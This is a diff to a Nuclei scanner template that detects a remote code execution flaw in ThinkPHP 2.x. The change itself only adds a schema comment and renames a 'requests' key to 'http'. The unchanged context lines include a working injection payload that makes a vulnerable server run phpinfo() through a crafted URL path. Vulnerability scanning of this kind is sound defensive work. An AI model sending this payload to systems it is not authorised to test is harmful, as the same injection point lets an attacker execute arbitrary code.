@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: thinkphp-2-rce
 
 info:
@@ -8,7 +9,7 @@ info:
   reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/2-rce
   tags: thinkphp,rce
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/index.php?s=/index/index/name/$%7B@phpinfo()%7D"
